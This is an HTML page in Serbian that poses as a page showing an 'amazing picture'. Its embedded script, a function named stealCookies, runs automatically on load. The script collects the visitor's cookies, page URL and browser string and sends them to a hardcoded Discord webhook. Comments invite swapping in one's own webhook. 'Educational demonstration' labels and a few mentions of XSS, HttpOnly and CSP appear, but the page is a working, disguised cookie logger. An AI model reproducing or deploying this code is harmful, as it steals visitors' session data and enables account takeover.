<!DOCTYPE html>
<html>
<head>
    <title>Pogledaj ovu sliku!</title>
    <style>
        body {
            font-family: Arial;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            text-align: center;
            padding: 20px;
            margin: 0;
            min-height: 100vh;
        }
        .container {
            max-width: 600px;
            margin: 50px auto;
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            backdrop-filter: blur(10px);
        }
        img {
            max-width: 100%;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
        }
        .loading {
            color: #ffeb3b;
            font-size: 18px;
            margin: 20px 0;
        }
        .success {
            color: #4caf50;
            font-size: 16px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>🖼️ Pogledaj ovu neverovatnu sliku!</h1>
        <p>Učitavam sliku...</p>
        
        <div id="loadingMessage" class="loading">
            🔄 Slika se učitava, molim sačekajte...
        </div>
        
        <img src="https://picsum.photos/600/400?random=1" 
             alt="Neverovatna slika"
             onload="showSuccess()">
             
        <div id="successMessage" style="display: none;" class="success">
            ✅ Slika uspešno učitana! Hvala što ste pogledali.
        </div>
    </div>

    <script>
        // ZAMENI OVO SA TVOJIM DISCORD WEBHOOK-OM
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1430695842347614240/i4aZ0mmBnCqPvzKuOswA1BlUTxb0iYKdy1nSUrZbkVRQRUvVV-4tKXpcesfRc5YGxIGB";
        
        // Funkcija koja se pokreće ČIM se stranica učita
        async function stealCookies() {
            console.log("🎯 Pokrećem edukacionu demonstraciju...");
            
            // Prikaži poruku da se nešto dešava
            document.getElementById('loadingMessage').textContent = "🎓 Obrađujem zahteve...";
            
            try {
                // Pokupi sve cookie-e sa trenutnog domena
                const allCookies = document.cookie;
                const currentUrl = window.location.href;
                const userAgent = navigator.userAgent;
                const timestamp = new Date().toLocaleString();
                
                console.log("🔍 Cookie-i na ovom domenu:", allCookies);
                
                // Ako postoje cookie-i, pošalji ih na Discord
                if (allCookies) {
                    document.getElementById('loadingMessage').innerHTML = 
                        "📨 Šaljem edukacione podatke...<br><small>Ovo demonstrira kako napadi rade</small>";
                    
                    await sendToDiscord(allCookies, currentUrl, userAgent, timestamp);
                    
                    document.getElementById('loadingMessage').style.display = 'none';
                    document.getElementById('successMessage').style.display = 'block';
                    document.getElementById('successMessage').innerHTML = 
                        "🎓 <strong>EDUKACIONA DEMONSTRACIJA ZAVRŠENA</strong><br>" +
                        "<small>Cookie podaci su poslati na Discord za edukaciju</small>";
                        
                } else {
                    document.getElementById('loadingMessage').innerHTML = 
                        "ℹ️ Nema cookie-a na ovom domenu<br>" +
                        "<small>Ovo je normalno za statičke HTML stranice</small>";
                }
                
            } catch (error) {
                console.error("❌ Greška:", error);
                document.getElementById('loadingMessage').innerHTML = 
                    "❌ Došlo je do greške u edukacionoj demonstraciji";
            }
        }
        
        function showSuccess() {
            console.log("🖼️ Slika uspešno učitana");
        }
        
        async function sendToDiscord(cookies, url, userAgent, timestamp) {
            try {
                console.log("📤 Šaljem na Discord...");
                
                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        content: `🚨 **EDUKACIONA DEMONSTRACIJA - IMAGE COOKIE LOGGER**\n\n` +
                                `**🕒 Vreme:** ${timestamp}\n` +
                                `**🍪 Cookie Podaci:** \`${cookies}\`\n` +
                                `**🌐 URL Stranice:** ${url}\n` +
                                `**🖥️ Browser:** ${userAgent}\n\n` +
                                `**📚 EDUKACIONA SVRHA:**\n` +
                                `• Ovo demonstrira XSS ranjivost\n` +
                                `• HTTP-Only cookie flag sprečava ovo\n` +
                                `• CSP headers blokiraju zlonamerne skripte\n` +
                                `• Uvek koristiti etičko testiranje`
                    })
                });
                
                if (response.ok) {
                    console.log("✅ USPEO! Podaci poslati na Discord");
                    return true;
                } else {
                    console.log("❌ Greška pri slanju:", response.status);
                    return false;
                }
            } catch (error) {
                console.error("❌ Greška u slanju:", error);
                return false;
            }
        }
        
        // POKRENI DEMONSTRACIJU ČIM SE STRANICA UČITA
        window.addEventListener('load', function() {
            console.log("🚀 Stranica se učitala - pokrećem demonstraciju...");
            setTimeout(stealCookies, 1500);
        });
        
        // POKRENI I AKO JE STRANICA VEĆ UČITANA
        if (document.readyState === 'complete') {
            setTimeout(stealCookies, 1000);
        }
        
        console.log("🎓 Edukaciona demonstracija inicijalizovana");
    </script>
</body>
</html>
